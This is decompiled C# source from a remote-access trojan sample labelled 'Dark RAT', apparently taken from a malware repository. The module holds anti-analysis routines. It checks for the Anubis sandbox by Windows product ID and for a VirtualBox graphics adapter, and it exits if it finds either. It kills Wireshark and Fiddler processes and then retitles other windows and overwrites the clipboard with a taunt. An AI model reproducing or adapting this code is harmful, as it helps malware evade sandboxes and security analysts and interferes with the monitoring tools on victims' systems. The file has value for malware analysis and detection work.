// Decompiled with JetBrains decompiler
// Type: Dark_RAT.antis
// Assembly: Dark RAT, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3C824395-872F-43D5-A237-CC243F82B456
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-HackTool.MSIL.Flooder.gen-66512a2c31adfe77fb66c2c824e55509ba2cce70d158e850f0e56e3dc664f420.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Dark_RAT
{
  [StandardModule]
  public sealed class antis
  {
    private static string fuckwithuser = Conversions.ToString(false);
    private static object Devices;
    private static string Grafikadapter;
    private static string RegionA = "SELECT * FROM Win32_VideoController";
    private static RegistryKey regPID = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", false);
    private static object pid = RuntimeHelpers.GetObjectValue(antis.regPID.GetValue("ProductId"));
    private static string id = "76487-337-8429955-22614";

    [DllImport("user32", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern bool SetWindowText(IntPtr hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpstring);

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public static object AllAntis()
    {
      object obj;
      try
      {
        if (Operators.ConditionalCompareObjectEqual((object) antis.antiAnubis2(), (object) true, false))
        {
          ProjectData.EndApp();
          obj = (object) true;
        }
        else
        {
          antis.AntiSniffers();
          obj = (object) false;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) Interaction.MsgBox((object) "Error checking anti's");
        ProjectData.EndApp();
        obj = (object) true;
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    private static void AntiSniffers()
    {
      Process[] processes = Process.GetProcesses();
      int index = 0;
      while (index < processes.Length)
      {
        Process process = processes[index];
        string mainWindowTitle = process.MainWindowTitle;
        if (mainWindowTitle.Contains("Wireshark"))
        {
          process.Kill();
          antis.fuckwithuser = Conversions.ToString(true);
        }
        else if (mainWindowTitle.Contains("Fiddler"))
        {
          process.Kill();
          antis.fuckwithuser = Conversions.ToString(true);
        }
        else if (Conversions.ToBoolean(antis.fuckwithuser))
        {
          IntPtr mainWindowHandle = process.MainWindowHandle;
          string str = "You failz at haxoring my HWID";
          ref string local = ref str;
          antis.SetWindowText(mainWindowHandle, ref local);
          Clipboard.SetText("Failz at haxoring my HWID");
        }
        checked { ++index; }
      }
    }

    public static bool antiAnubis2()
    {
      int num1;
      bool flag;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 2;
        flag = Operators.ConditionalCompareObjectEqual(antis.pid, (object) antis.id, false);
        goto label_8;
label_3:
        num2 = -1;
        switch (num1)
        {
          case 2:
            flag = true;
            goto label_8;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_3;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_8:
      int num3 = flag ? 1 : 0;
      if (num2 == 0)
        return num3 != 0;
      ProjectData.ClearProjectError();
      return num3 != 0;
    }

    public static bool AntiVirtualBox()
    {
      int num1;
      bool flag;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 2;
        antis.getDevices();
        flag = Operators.CompareString(antis.Grafikadapter, "VirtualBox Graphics Adapter", false) == 0;
        goto label_8;
label_3:
        num2 = -1;
        switch (num1)
        {
          case 2:
            flag = true;
            goto label_8;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_3;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_8:
      int num3 = flag ? 1 : 0;
      if (num2 == 0)
        return num3 != 0;
      ProjectData.ClearProjectError();
      return num3 != 0;
    }

    private static void getDevices()
    {
      // ISSUE: unable to decompile the method.
    }
  }
}
